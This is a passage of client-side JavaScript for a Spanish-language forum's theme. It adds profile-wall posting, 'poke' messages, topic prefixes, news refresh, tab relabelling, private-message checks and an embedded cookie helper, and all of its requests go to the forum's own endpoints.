                    $('#profile-advanced-details2').find('.message-header').find('a[href*="/u"]:first').attr('onclick', 'ops.rS_iw(this);return false');
                })
            }
        },
        rS_iw: function (o) {
            var a = $.getby('#avac_status_textarea'),
                b = o.children[0].children[0].textContent;
            a.height = '15px';
            a.focus();
            a.placeholder = 'Responder a ' + b
        },
        wall_post: function (c) {
            if (ops.logout) {
                var a = $.getby('#avac_status_textarea'),
                    b = a.placeholder.indexOf('Responder a') >= 0 && (a.placeholder.replace('Responder a ', ''));
                $.post('/privmsg', {
                    subject: ops.mi_nombre + ' escribió en tu muro',
                    message: a.value,
                    username: a.placeholder.indexOf('Responder a') < 0 ? ops.mi_nombre : b,
                    mode: 'post_profile',
                    folder: 'profile',
                    post: 'Send'
                }).success(function () {
                    a.value = '';
                    a.placeholder = 'Mensaje enviado';
                    a.height = '15px';
                    setTimeout(function () {
                        a.placeholder = ops.mi_nombre + ' escribe en tu muro';
                    }, 500);
                    ops.loadwall();
                });
            }
        },
        extra_actividad: function (c) {
            ops.actividad(c.href);
            ops.contenedor.innerHTML = '<div style="width: 100%; text-align:center; margin: 30px 0;"><center><i style="color:rgb(0, 0, 0);font-size:32px"class="fa fa-spinner fa-spin"></i></center>';
        },
        actividad: function (u) {
            var b, url = /\/u(89|92)wall/g.test(u) ? u : '/u3wall';
            ops.contenedor = $.getby('.contenedor')[0];
            console.log('url actividad es:' + url);
            $.get(url, function (m) {
                var b = $('#profile-advanced-details ol', m)[0].innerHTML;
                ops.contenedor.innerHTML = b;
            }).done(function () {
                var a = ops.contenedor,
                    d = a.getElementsByTagName('a'),
                    e = a.getElementsByClassName('avatar'),
                    f = a.getElementsByTagName('table'),
                    g = a.getElementsByClassName('.message-header'),
                    h = (new Date).getHours(),
                    i = (new Date).getMinutes(),
                    j = 'Actualizado: ' + h + ':' + (i < 10 ? '0' + i : i) + ' hrs.',
                    k = a.getElementsByClassName('.message-text'),
                    m = $.getby('#actividad_update');
                for (var i = 0; i < d.length; i++) {
                    /\/u(\d+)wall\?s\=/g.test(d[i].href) && d[i].remove();
                    /\/u(\d+)wall\?d\=/g.test(d[i].href) && d[i].remove();
                }
                for (var i = 0; i < e.length; i++) {
                    e[i].remove()
                }
                for (var i = 0; i < f.length; i++) {
                    f[i].remove()
                }
                for (var i = 0; i < k.length; i++) {
                    k[i].innerHTML.indexOf('cambio su avatar') >= 0 && localStorage.clear()
                }
                m.textContent = j;
            });
        },
        prefijos_all_add: function () {
            prefijos_all.initialize()
        },
        loading_general: function () {
            $.getby('#main').insertAdjacentHTML('beforeend', '<center ID="lo_d"><i style="position:fixed;top: 45%;color:rgb(0, 0, 0);font-size:60px"class="fa fa-spinner fa-spin"></i></center>');
        },
        loading_general_off: function () {
            $(window).load(function () {
                $('#main').find('center').has('.fa-spinner').remove()
            });
        },
        inload_: function () {
            var load = $.getby('#lo_d');
            load && load.remove()
        },
        Co_Ki: function () {
            (function (factory) {
                if (typeof define === 'function' && define.amd) {
                    define(factory);
                } else if (typeof exports === 'object') {
                    module.exports = factory();
                } else {
                    var _OldCookies = window.Cookies;
                    var api = window.Cookies = factory();
                    api.noConflict = function () {
                        window.Cookies = _OldCookies;
                        return api;
                    };
                }
            }(function () {
                function extend() {
                    var i = 0;
                    var result = {};
                    for (; i < arguments.length; i++) {
                        var attributes = arguments[i];
                        for (var key in attributes) {
                            result[key] = attributes[key];
                        }
                    }
                    return result;
                }
                function init(converter) {
                    function api(key, value, attributes) {
                        var result;
                        if (arguments.length > 1) {
                            attributes = extend({
                                path: '/'
                            }, api.defaults, attributes);
                            if (typeof attributes.expires === 'number') {
                                var expires = new Date();
                                expires.setMilliseconds(expires.getMilliseconds() + attributes.expires * 864e+5);
                                attributes.expires = expires;
                            }
                            try {
                                result = JSON.stringify(value);
                                if (/^[\{\[]/.test(result)) {
                                    value = result;
                                }
                            } catch (e) {}
                            if (!converter.write) {
                                value = encodeURIComponent(String(value)).replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent);
                            } else {
                                value = converter.write(value, key);
                            }
                            key = encodeURIComponent(String(key));
                            key = key.replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent);
                            key = key.replace(/[\(\)]/g, escape);
                            return (document.cookie = [key, '=', value, attributes.expires && '; expires=' + attributes.expires.toUTCString(), attributes.path && '; path=' + attributes.path, attributes.domain && '; domain=' + attributes.domain, attributes.secure ? '; secure' : ''].join(''));
                        }
                        if (!key) {
                            result = {};
                        }
                        var cookies = document.cookie ? document.cookie.split('; ') : [];
                        var rdecode = /(%[0-9A-Z]{2})+/g;
                        var i = 0;
                        for (; i < cookies.length; i++) {
                            var parts = cookies[i].split('=');
                            var name = parts[0].replace(rdecode, decodeURIComponent);
                            var cookie = parts.slice(1).join('=');
                            if (cookie.charAt(0) === '"') {
                                cookie = cookie.slice(1, -1);
                            }
                            try {
                                cookie = converter.read ? converter.read(cookie, name) : converter(cookie, name) || cookie.replace(rdecode, decodeURIComponent);
                                if (this.json) {
                                    try {
                                        cookie = JSON.parse(cookie);
                                    } catch (e) {}
                                }
                                if (key === name) {
                                    result = cookie;
                                    break;
                                }
                                if (!key) {
                                    result[name] = cookie;
                                }
                            } catch (e) {}
                        }
                        return result;
                    }
                    api.get = api.set = api;
                    api.getJSON = function () {
                        return api.apply({
                            json: true
                        }, [].slice.call(arguments));
                    };
                    api.defaults = {};
                    api.remove = function (key, attributes) {
                        api(key, '', extend(attributes, {
                            expires: -1
                        }));
                    };
                    api.withConverter = init;
                    return api;
                }
                return init(function () {});
            }));
        },
        cambiar_boton: function () {
            var e = $.getby('.i_post'),
                l = e.length;
            for (var i = 0; i < l; i++) {
                if (/\/post\?f=3&mode=newtopic/g.test(e[i].href)) {
                    e[i].href = '/post?f=14&mode=newtopic';
                }
            }
        },
        fun_serialize_p: function () {
            $.post('/profile', $(document.forms.post).serialize() + '&submit=1').success(function (o) {
                if (-1 != $(o).find('.error').text().indexOf('Tu perfil ha sido actualizado')) {
                    ops.notify(ops.mi_nombre + ' tu perfil ha sido actualizado');
                }
            });
        },
        close_rsp: function (c) {
            $(c).closest('fieldset').find('.l_pass').slideUp(function () {
                $(this).remove()
            })
        },
        broken_link: function () {
            for (var b, a = 'http://i59.tinypic.com/2d9e69v.jpg', t = function (t) {
                    b = new Image, b.onerror = function () {
                        t.src = a
                    }, b.src = t.src
                }, o = $.getby('img'), i = o.length; - 1 !== --i;) t(o[i])
        },
        open_blank: function () {
            if (ops.soy_adm) {
                var a = $.getby('a'),
                    l = a.length;
                for (var t = 0; t < l; t++) {
                    /\/admin/g.test(a[t].href) && a[t].setAttribute('target', '_blank')
                }
            }
        },
        menuactivo: function () {
            var e = $.getby('#page-header');
            if (e)
                for (var t = window.location.href.replace(/\?.*|#.*/, ''), o = e.getElementsByTagName('A'), a = 0, i = o.length; i > a; a++)
                    if (/mainmenu/.test(o[a].className) && t === o[a].href.replace(/\?.*|#.*/, '')) {
                        o[a].className += ' menuactif';
                        break;
                    }
            var a = $.getby('.rightside')[0].getElementsByTagName('a'),
                l = a.length,
                b = '<a href="/h9-paypal" target="_blank"> &nbsp;&nbsp;Donar</a>';
            for (var i = 0; l > i; i++) /\/abuse\?/g.test(a[i].href) ? (a[i].textContent = 'Denunciar', a[i].insertAdjacentHTML('afterend', b), a[i].setAttribute('onclick', 'ops.abuse_msg(this);return false')) : /www\.foroactivo\.com\/phpbb/g.test(a[i].href) ? (a[i].href = 'https://www.phpbb.com/downloads/', a[i].text = 'phpBB3') : /\/statistics/g.test(a[i].href) && a[i].setAttribute('onclick', 'ops.start_Ncontent(\'pl_a5\', this);return false');
            var s = $.getby('.icon-home')[0];
            s.href = '/h2-staff';
            s.setAttribute('title', 'Acerca de nosotros...');
        },
        tagprefixo: function () {
            var a = document.forms.post;
            a.subject.value = a.subject.value.match(/\[(.*?)\]/) != null && a.prefijos.value ? a.prefijos.value + a.subject.value.replace(/\[(.*?)\]/, '') : a.prefijos.value + " " + a.subject.value;
        },
        prefijos_: ['Aviso', 'Tutorial', 'Duda', 'Pendiente', 'Aprobado', 'Rechazado', 'Resuelto', 'Pedido', 'Aporte', 'Afiliación', 'Idea', 'Staff', 'Publicidad', 'En curso', 'Resuelto', 'Actualizado', 'Sugerencia', 'Ayuda', 'Idea'],
        poner_prefijos: function () {
            var a = '<select id="prefCA"  name="prefijos" onchange="ops.tagprefixo()"><option value="">Prefijo</option>';
            for (var b in ops.prefijos_) {
                a += "<option value=[" + ops.prefijos_[b] + "]>" + ops.prefijos_[b] + "</option>";
            }
            a += "</select>";
            document.forms.post.subject.insertAdjacentHTML('beforebegin', a)
        },
        news_first: function () {
            var b, g, h, a = $.getby('#news_auto_refresh'),
                c = $.getby('.mod_recent_topics'),
                d = (new Date()).getHours(),
                e = (new Date()).getMinutes(),
                f = d + ':' + (e < 10 ? '0' + e : e) + 'hrs.';
            if (pu) {
                ops.reload_news()
            } else {
                a.innerHTML = c[0].innerHTML;
                b = '<div id="newupdate" style="margin-top: -5px;">Actualizado: ' + f + '</div>';
                a.insertAdjacentHTML('beforeend', b);
                ops.avatarnews();
                g = $.getby('.news_topic'),
                    h = g.length;
                for (var i = 0; i < h; i++) {
                    $._fadeIn(g[i], 500)
                }
            }
        },
        reload_news: function () {
            var c, g, h, d, a = '<div style="width: 100%; text-align:center; margin: 35% 0 auto;display:table"><center><i style="color:#fff;font-size:32px" class="fa fa-spinner fa-spin"></i></center></div>',
                b = $.getby('#news_auto_refresh'),
                e = (new Date()).getMinutes(),
                f = (new Date()).getHours();
            b.innerHTML = a;
            $.get('/forum', function (o) {
                c = $('.mod_recent_topics', o)[0].innerHTML;
                b.innerHTML = c
            }).success(function () {
                ops.prefijos_all_add();
                ops.avatarnews();
                d = '<div id="newupdate" style="margin-top: -5px;">Actualizado: ' + f + ':' + (e < 10 ? '0' + e : e) + ' hrs.</div>';
                b.innerHTML += d;
                g = $.getby('.news_topic'),
                    h = g.length;
                for (var i = 0; i < h; i++) {
                    $._fadeIn(g[i], 500)
                }
            });
        },
        sub_ind_funciones: function () {
            var a = $.getby('.sprite-arrow_prosilver_right'),
                b = a.length;
            for (var i = 0; i < b; i++) {
                a[i].insertAdjacentHTML('beforebegin', '<span class="ver" title="ir al último mensaje escrito" style="background:rgb(255, 140, 0);color:rgb(255, 255, 255);border-radius:2px!important;text-shadow:none!important;padding:0 1px;">Ir <i class="fa fa-chevron-circle-right" aria-hidden="true"></i></span>');
            }
        },
        poke: function () {
            if (ops.logout) {
                var a = $.getby('.activetab')[0].getElementsByTagName('a')[0],
                    b = $.getby('.message-footer');
                if (a.innerHTML.indexOf('fa-th-large') >= 0 && b.length) {
                    for (var i = 0; i < b.length; i++) {
                        var c = b[i].parentNode.parentNode.children[0].children[0].href.match(/u(\d+)/)[1],
                            d = b[i].parentNode.children[0].getElementsByTagName('button')[1].name,
                            e = '<li><a href="/privmsg?mode=post_profile&u=' + c + '" class="pokie" onclick= "ops.poke_f(\'' + c + '\',\'' + d + '\');return false">&nbsp;<i class="fa fa-hand-o-right" aria-hidden="true"></i> Toque</a></li>';
                        if (d != ops.mi_nombre) {
                            !b[i].getElementsByClassName('pokie').length && b[i].insertAdjacentHTML('afterbegin', e);
                        }
                    }
                }
            }
        },
        poke_f: function (a, b) {
            var c = ' [table class=poke][tr][td][img]' + ops.lang.poke_img + '[/img][/td][td]¡Te envié un Toque![/td][/tr][/table] ';
            ops.wall_post_subject = 'Toque';
            ops.wall_post_message = c;
            ops.wall_post_name = b;
            ops.wall_post_done = function () {
                $.boxes('alert', 'enviaste un toque a ' + b);
            }
            ops.wall_post_send();
        },
        muro_f: function () {
            var d, c, o, a = $.getby('#main'),
                b = $.getby('#profile-advanced-add');
            if (b && ('Suprimir de mi lista de amigos' === b.children[0].textContent) || ops.soy_staff || ops.nombre_perfil === ops.mi_nombre) {
                o = '<div id="AAGquickvm_rubbish"></div><form id="AAGquickvm_form" name="post"><div id="AAGquickvm_bb"><span onclick="ops.add(\'b\')"  style="font-weight:bold"><i class="fa fa-bold"></i></span><span onclick="ops.add(\'u\')" style="text-decoration: underline"><i class="fa fa-underline"></i></span><span onclick="ops.add(\'i\')" style="font-style: italic"><i class="fa fa-italic"></i></span><span onclick="ops.add(\'url\')"><i class="fa fa-external-link-square" aria-hidden="true"></i></span><span onclick="ops.add(\'img\')"><i class="fa fa-tag"></i></span><span onclick="ops.add(\'quote\')"><i class="fa fa-quote-left" aria-hidden="true"></i></span></div><div id="AAGquickvm_main"><textarea id="AAGquickvm_message" placeholder="Escribe un mensaje en el muro de ' + ops.nombre_perfil + '" name="message"></textarea></div><div id="AAGquickvm_foot"><span id="AAGquickvm_send" class="send_alternativo" onclick="ops.post_wall(this)">Enviar Mensaje</span></div></form>',
                    d = $.getby('#cp-main').getElementsByClassName('panel')[0];
                d.insertAdjacentHTML('afterbegin', o);
                ops.Me_Mo();
                c = $.getby('#AAGquickvm_message');
                window.onbeforeunload = function () {
                    return '' != c.value ? ops.mi_nombre + ' todavía no has enviado el mensaje.' : void 0
                }
            } else if (b && ('Suprimir de mi lista de amigos' != b.children[0].textContent)) {
                a.classList.add('no_friend');
            }
            a.classList.add('wall');
        },
        focus_text: function () {
            var a = $.getby('#AAGquickvm_message');
            if (a) {
                a.onfocus = function () {
                    $('#AAGquickvm_bb').find('img').hide().removeClass('active'), $(this).on('blur', function () {
                        $('#AAGquickvm_bb').find('img').show().addClass('active')
                    })
                }
            };
        },
        ani_text: function () {
            var a = $.getby('#AAGquickvm_message');
            if (a) {
                a.onclick = function () {
                    $(this).animate({
                        height: '250px'
                    }, 300)
                }
            };
        },
        post_wall: function (c) {
            if (wl || $.getby('.activetab')[0].innerHTML.indexOf('fa-th-large') >= 0) {
                var a = $.getby('#AAGquickvm_message'),
                    b = a.placeholder.match(/\w+$/)[0],
                    c = $.getby('ol'),
                    d = '<li id="li_content"><div style="width: 100%; text-align:center; margin: 10px -14%;"><center><i style="color:#fff;font-size:32px"class="fa fa-spinner fa-spin"></i></center></div></li>';
                a.style.height = '250';
                '' != a.value && (window.onbeforeunload = false);
                ops.wall_post_name = b;
                ops.wall_post_message = a.value;
                ops.wall_post_subject = 'Mensaje para ' + b;
                ops.wall_post_done = function () {
                    c.length && (c[0].insertAdjacentHTML('afterbegin', d));
                    setTimeout(function () {
                        ops.d_psW();
                        a.value = '';
                        a.placeholder = 'Escribe un mensaje en el muro de ' + ops.nombre_perfil
                    }, 1000);
                    ops.Nacti_msg = ops.mi_nombre + ' escribió en el muro de : [url=' + window.location.href + ']' + ops.nombre_perfil + '[/url]';
                    ops.Na()
                };
                ops.wall_post_send()
            }
        },
        d_psW: function () {
            var b, e, a = $.getby('#cp-main'),
                c = $.getby('#AAGquickvm_message'),
                d = $.getby('.activetab')[0].innerHTML.indexOf('fa-th-large') >= 0,
                f = $.getby('#li_content')
            $.get('/u' + ts.match(/u(\d+)/)[1] + 'wall', function (o) {
                e = d && $.getby('ol');
                b = $('#cp-main ol > li', o)[0].innerHTML;
                e.length && (e[0].classList.add('re_load'), f.innerHTML = b);
                ops.R_oWl();
            }).done(function (u) {
                $._fadeIn($.getby('.re_load')[0], 500);
                $(c).animate({
                    height: '85px'
                }, 300);
                a.children[2] && 'Ningún mensaje' === a.children[2].children[3].children[1].textContent && (a.children[2].children[3].children[1].style.display = 'none', ops.confirm()),
                    $('html,body').animate({
                        scrollTop: $('.message-block:first').offset().top - 200
                    }, 200), $('.zzBoxes.alert').fadeOut()
            });
        },
        r_w_o: function (a) {
            var e = a.parentNode.parentNode.getElementsByClassName('message-text')[0].textContent,
                c = $.getby('#AAGquickvm_message'),
                b = a.name;
            c.value += '[quote="' + b + '"]' + e + '[/quote]\n';
            $('html,body').animate({
                scrollTop: $('#AAGquickvm_bb').offset().top - 50
            }, 200);
            $(c).animate({
                height: '250px'
            }, 300);
            c.setAttribute('placeholder', 'Citar a ' + b);
        },
        R_oWl: function () {
            var z, a, b, d, f, h, g, j, k, l, m, n,
                e = 'color:rgb(77, 128, 0);margin-left:3px;text-shadow:0 1px rgba(255,255,255,0.55);font-size:14px;',
                t = '<i class="fa fa-wifi online" style="' + e + '"></i>',
                c = $.getby('.message-header');
            for (var i = 0; i < c.length; i++) {
                d = c[i].getElementsByTagName('em'),
                    a = c[i].getElementsByTagName('a'),
                    f = a.length && a[0].textContent.match(/\w+/g),
                    b = '<button class="quote_to" style="margin-left:2px" name="' + f + '"onclick="ops.r_w_o(this)"><i class="fa fa-quote-left" aria-hidden="true"></i> Citar a ' + f + ' </button>',
                    j = '<button class="wall_to" name="' + f + '" onclick="ops.F_s_WL(\'responder_otros\',this); return false">  <i class="fa fa-comments-o" aria-hidden="true"></i> Responder a ' + f + ' </button>',
                    k = c[i].getElementsByClassName('message-date'),
                    l = '<i class="fa fa-clock-o" aria-hidden="true"></i>&nbsp;',
                    m = !c[i].getElementsByClassName('quote_to').length,
                    n = !c[i].getElementsByClassName('fa-clock-o').length;
                n && k[0].insertAdjacentHTML('afterbegin', l);
                m && c[i].insertAdjacentHTML('afterbegin', b);
                a.length && a[0].setAttribute('title', 'responder en el muro de ' + f);
                d.length && (d[0].innerHTML = t);
                a.length && (a[0].outerHTML = j);
                $(c[i]).contents().filter(function () {
                    return 3 === this.nodeType
                }).remove()
            }
            var l = $.getby('.message-footer');
            for (var i = 0; i < l.length; i++) {
                z = l[i].getElementsByTagName('a');
                if (z.length && ops.nombre_perfil == ops.mi_nombre || z.length && ops.soy_staff) {
                    if ((/\/u(\d+)wall(\?)s/g.test(z[0].href) && z[0].innerHTML.indexOf('floppy') < 0) && z[0].innerHTML.indexOf('onclick') < 0) {
                        z[0].innerHTML = '&nbsp;<i class="fa fa-floppy-o" aria-hidden="true"></i> Guardar';
                        z[0].setAttribute('onclick', 'ops.F_s_WL("guardar_wall",this); return false');
                        z[0].classList.add('wallmove');
                    }
                    if (/\/u(\d+)wall(\?)d/g.test(z[1].href) && z[1].innerHTML.indexOf('trash') < 0 && z[1].innerHTML.indexOf('walldelete') < 0) {
                        z[1].innerHTML = '&nbsp;<i class="fa fa-trash" aria-hidden="true"></i> Borrar';
                        z[1].classList.add('walldelete');
                    }
                }
            }
            setTimeout(function () {
                ops.poke()
            }, 100)
        },
        F_s_WL: function (e, t) {
            switch (e) {
            case 'responder_otros':
                var s = t.name,
                    c = $.getby('#AAGquickvm_message');
                $('html,body').animate({
                    scrollTop: $('#AAGquickvm_bb').offset().top - 50
                }, 200), $(c).animate({
                    height: '250px'
                }, 300);
                c.placeholder = 'Responder a ' + s;
                break;
            case 'guardar_wall':
                var o = t.href,
                    a = t.parentNode.parentNode.parentNode.parentNode;
                $.get(o, function () {
                    console.log('Ok: almacenado');
                    ops.notify(ops.mi_nombre + ' : Guardaste el mensaje lo puedes buscar en tu inbox en guardados')
                }).done(function () {
                    $._fadeOut(a, 500)
                });
                break;
            }
        },
        otros_muro: function () {
            var g = $.getby('#cp-main').getElementsByClassName('panel')[0],
                h = '<ol><center><i style ="font-size: 340px; color: rgb(63, 76, 107); text-shadow: 0 1px rgb(255, 255, 255)" class="fa fa-frown-o"></i></center></ol>';
            if (g.innerHTML.indexOf('Ningún mensaje') >= 0) {
                g.setAttribute('style', 'min-height:660px!important');
                g.insertAdjacentHTML('beforeend', h);
            }
        },
        f_WL_c: function () {
            var a = $.getby('#cp-main').getElementsByTagName('h1')[0],
                b = $.getby('#tabs').getElementsByTagName('span')[0],
                c = $.getby('#AAGquickvm_bb'),
                d = $.getby('.module')[0].getElementsByTagName('img')[0];
            ops.nombre_perfil === ops.mi_nombre ? (a.innerHTML = '<p class="walltitulo">' + ops.mi_avatar + ' Mi muro</p>', document.title = 'Mi muro', b.innerHTML = '<i class="fa fa-th-large"></i> Mi muro', c && (c.innerHTML += ops.mi_avatar)) : (a.innerHTML = '<p class="walltitulo"><img src="' + d.src + '"> Escribe un mensaje en el muro de ' + ops.nombre_perfil + '</p>', document.title = 'Muro de ' + ops.nombre_perfil, b.innerHTML = '<i class="fa fa-th-large"></i> Muro de ' + ops.nombre_perfil, c && (c.innerHTML += ops.mi_avatar))
        },
        wall_post_subject: 'Mensaje',
        wall_post_name: '',
        wall_post_message: 'Mensaje',
        wall_post_done: function () {
            console.log('Enviado')
        },
        wall_post_send: function () {
            $.post('/privmsg', {
                username: ops.wall_post_name,
                folder: 'profile',
                mode: 'post_profile',
                lt: '',
                post: 1,
                message: ops.wall_post_message,
                subject: ops.wall_post_subject
            }).success(ops.wall_post_done())
        },
        N_Fr_mD: function () {
            var a = $.getby('#profile-advanced-add'),
                b = $.getby('.module'),
                c = ops.nombre_perfil,
                d = ops.mi_nombre;
            a && c != d && (a.children[2] && a.children[2].remove(), b[1].getElementsByTagName('div')[2].textContent.indexOf('aún no tiene ningún amigo') >= 0 && (b[1].style.visibility = 'hidden'))
        },
        historial: function () {
            $.getby('#wrap').classList.add('history'),
                $.getby('#profile-advanced-right').style.display = 'none',
                $.getby('.module')[0].style.display = 'none',
                $.getby('.fa-spinner')[0].remove(),
                $.getby('#main').classList.add('wallhistorial'),
                document.title = 'Actividad de los usarios',
                $.getby('#main-content').classList.add('wall'),
                ops.f_WL_c()
        },
        etiquetas_pu: function () {
            var a = $.getby('#tabs').getElementsByTagName('span'),
                b = '<i class="fa fa-th-large"></i>&nbsp;&nbsp;Muro',
                c = '<i class="fa fa-th-list"></i>&nbsp;&nbsp;Perfil',
                d = '<i class="fa fa-pie-chart"></i>&nbsp;&nbsp;Estadísticas',
                e = '<i class="fa fa-users"></i>&nbsp;&nbsp;Amigos',
                f = '<i class="fa fa-share-alt-square"></i>&nbsp;&nbsp;Contacto',
                g = $.getby('.activetab')[0].getElementsByTagName('span')[0];
            g.textContent.indexOf('Muro') < 0 && (a[0].innerHTML = b), a[1].innerHTML = c, a[2].innerHTML = d, g.textContent.indexOf('migos') < 0 && (a[3].innerHTML = e), a[4].innerHTML = f
        },
        online_pu: function () {
            var a = $.getby('.modulo_uno')[0],
                b = a.getElementsByTagName('em'),
                c = a.getElementsByTagName('strong')[0];
            b.length && b[0].textContent == '(en línea)' ? b[0].innerHTML = ops.lang.wifion : c.innerHTML += ops.lang.wifioff
        },
        location: function () {
            var d, a = $.getby('.modulo_uno'),
                b = a[0].getElementsByTagName('img')[0],
                c = a[0].getElementsByTagName('strong')[0],
                e = a[0].getElementsByTagName('em');
            if (e.length) {
                var l = document.createElement('div');
                c.style = 'margin-top:-20px;display:inline-table';
                $(l).load('/viewonline .forumbg', function () {
                    for (var o, e = 0, i = l.getElementsByTagName('a'); o = i[e++];) {
                        if (ops.nombre_perfil.indexOf(o.textContent) >= 0) {
                            d = ops.nombre_perfil == ops.mi_nombre ? 'Viendo mi perfi' : o.parentNode.parentNode.lastChild.textContent,
                                b.parentNode.parentNode.parentNode.insertAdjacentHTML('beforeend', '<div class="newonlineprofile"><span class="forum-location">' + d + '</span></div>');
                        }
                    }
                })
            } else {
                b.parentNode.parentNode.insertAdjacentHTML('beforeend', ops.lang.noestoy);
            }
        },
        establecer_banner: function () {
            var c, a = '<div id="profile-advanced-banner" align="center"><img id="banner-image" style="width:994px;margin-left:-10px;height:315px;border-bottom:1px solid rgb(154, 154, 154);"src="' + ops.lang.banner_blank + '" /></div>',
                b = $.getby('#profile-advanced-details');
            b.insertAdjacentHTML('afterbegin', a);
            c = $.getby('#banner-image');
            Cookies.get('banner_src' + ops.nombre_perfil) ? c.src = Cookies.get('banner_src' + ops.nombre_perfil) : ops.get_banner()
        },
        get_banner: function () {
            var o, t, a = $.getby('#profile-advanced-banner'),
                b = $.getby('.mi_status');
            $.get('/u' + location.pathname.match(/[0-9]+/)[0], function (e) {
                t = $('#field_id3 .field_uneditable', e)[0].textContent;
                a.children[2].src = t;
                b.length && (b[0].style.display = 'block');
                o = 'banner_src' + ops.nombre_perfil;
                Cookies.set(o, t, {
                    expires: 1
                })
            })
        },
        toque_f: function () {
            pu && (ops.wall_post_subject = 'Toque', ops.wall_post_message = ' [table class=poke][tr][td][img]http://www.adictosalgear.org/facebook_poke.png[/img][/td][td]¡Te envié un Toque![/td][/tr][/table] ', ops.wall_post_name = ops.nombre_perfil, ops.wall_post_done = function () {
                var c = $.getby('ol'),
                    d = '<li id="li_content"><div style="width: 100%; text-align:center; margin: 10px -14%;"><center><i style="color:#fff;font-size:32px"class="fa fa-spinner fa-spin"></i></center></div></li>';
                c.length && (c[0].insertAdjacentHTML('afterbegin', d));
                setTimeout(function () {
                    var a = $.getby('.activetab')[0];
                    a.getElementsByTagName('span')[0].textContent.indexOf('Muro') > 0 && ops.d_psW()
                }, 1e3)
            }, ops.wall_post_send());
        },
        f_tab_pu: function () {
            var f, a = document.querySelectorAll('ol > li'),
                b = $.getby('#main'),
                c = $.getby('.module')[1],
                e = 'color:rgb(77, 128, 0);margin-left:3px;text-shadow:0 1px rgba(255,255,255,0.55);font-size:14px;',
                d = '<i class="fa fa-wifi online" style="' + e + '"></i>',
                g = $.getby('#tabs').getElementsByTagName('span')[3],
                h = $.getby('h1')[0],
                j = '<p class="friendtitulo" style="font-size:18px!important;color:rgb(51, 51, 51);display:block">Mis amigos</p>';
            for (var i = 0; i < a.length; i++) {
                a[i].classList.add('member_box');
                a[i].getElementsByClassName('avatar')[0].classList.add('avatar-mini');
                f = a[i].getElementsByTagName('em');
                f.length && (f[0].innerHTML = d);
            }
            b.classList.remove('wall'),
                b.classList.add('amigos'),
                c.style.visibility = 'hidden';
            ops.nombre_perfil === ops.mi_nombre ? (g.innerHTML = '<i class="fa fa-users"></i> Mis amigos', h.classList.add('fr-titulo'), h.innerHTML = j, document.title = 'Mis Amigos') : (g.innerHTML = '<i class="fa fa-users"></i> Amigos de ' + ops.nombre_perfil, h.classList.add('fr-titulo'), h.innerHTML = '<p class="friendtitulo" style="font-size:18px!important;color:rgb(51, 51, 51);display:block"> Amigos de  ' + ops.nombre_perfil + '</p>', document.title = 'Amigos de ' + ops.nombre_perfil), ops.add_fr_pu()
        },
        eDO_p: function () {
            var a = $.getby('#tabs'),
                b = a.getElementsByTagName('li'),
                c = a.getElementsByTagName('span'),
                d = '<i class="fa fa-pencil-square-o"></i>&nbsp;Información',
                e = '<i class="fa fa-cog"></i>&nbsp;Preferencias',
                f = '<i class="fa fa-picture-o"></i>&nbsp;Avatar',
                g = '<i class="fa fa-users"></i>&nbsp;Amigos',
                h = '<i class="fa fa-bell"></i>&nbsp;Notificaciones',
                i = '<i class="fa fa-bookmark"></i>&nbsp;Supervisados',
                j = '<i class="fa fa-heart"></i>&nbsp;Favoritos';
            b[2].remove(), c[0].innerHTML = d, c[1].innerHTML = e, c[2].innerHTML = f, c[3].innerHTML = g, c[4].innerHTML = h, c[5].innerHTML = i, c[6].innerHTML = j;
        },
        notify: function (e) {
            var t = document.createElement('DIV'),
                o = document.getElementById(Toolbar.LIVE_NOTIF);
            t.className = 'fa_notification', t.innerHTML = '<div class="content ellipsis new"><div class="avanotif" style="display: inline">' + ops.mi_avatar + '</div>' + e + '</div>', t.style.display = 'none', $(t).mouseover(function () {
                $(this).stop(!0, !0)
            }), $(t).mouseleave(function () {
                $(this).delay(5e3).fadeOut()
            }), o.insertBefore(t, o.firstChild), $(t.firstChild).dotdotdot(), $(t).fadeIn(100, function () {
                $(this).delay(6e3).fadeOut()
            })
        },
        sopiler_fx: function () {
            var t, b, c, a = $.getby('.spoiler');
            for (t = 0; t < a.length; t++) {
                b = a[t].children[0];
                b.onclick = function () {
                    c = this.nextElementSibling.children[0];
                    $(c).slideToggle()
                }
            }
        },
        check_mp: function () {
            var a = $.getby('.navbut4'),
                b = (new Date).getDate(),
                c = (new Date).getMonth(),
                d = (new Date).getFullYear(),
                f = (new Date).getHours(),
                g = (new Date).getMinutes(),
                m = '0 Mensajes';
            $.get('/forum', function (e) {
                ops.logout && $('#i_icon_mini_new_message', e).length;
                var t = $('#i_icon_mini_new_message', e)[0];
                t ? (m = parseInt(t.title.replace(/\D/g, '')), m = '<div class="TRnotice" style="display:inline">' + m + ' Mensaje' + (1 < m ? 's' : '') + '</div>') : t = t, a[0].children[0].innerHTML = m, console.log('buscando mps nuevos(' + b + '/' + (c < 10 ? '0' + (c + 1) : (c + 1)) + '/' + (d - 2e3) + ' - ' + f + ':' + (g < 10 ? '0' + g : g) + ')')
            })
        },
        init_check_mp: function () {
            setInterval(function () {
                ops.check_mp()
            }, 3.5e+4)
        },
        progreso: function () {
            var a = document.body,
                b = '<div id="progress"><dt><dt/><dd><dd/></div>';
            a.insertAdjacentHTML('beforeend', b);
            $('#progress').width(100 + '%').width('101%').delay(1000).fadeOut(2500, function () {
                ops.progreso_final()
            });
        },
        progreso_final: function () {
            $(window).load(function () {
                $.getby('#progress').remove();
            });
        },
        menufixed: function () {
            var e = $.getby('.navlinks'),
                f = $.getby('#quickLoginPanel'),
                s = $.getby('#ajaxSearch'),
                t = $.getby('#fa_toolbar'),
                m = $.getby('.move_login'),
                sa = $.getby('#fa_search');
            document.body.scrollTop > 240 ? (e.length && e[0].classList.add('menufijo'), t.classList.add('otherclass'), s && s.classList.add('in_scroll'), !ops.logout && f && f.classList.add('move_login'), $.getby('.announcement-bar').length ? (m.length && (m[0].style.marginTop = '100px'), sa.classList.add('si_An')) : (m.length && (m[0].style.marginTop = '13px'), sa.classList.add('no_An'))) : (e.length && e[0].classList.remove('menufijo'), t.classList.remove('otherclass'), (sa.classList.contains('si_An') || sa.classList.contains('no_An')) && sa.classList.remove('no_An', 'si_An'), f && f.classList.contains('move_login') && f.classList.remove('move_login'), f && (f.style.marginTop = '0'), s && s.classList.contains('in_scroll') && s.classList.remove('in_scroll'));
        },
        value_default: function () {
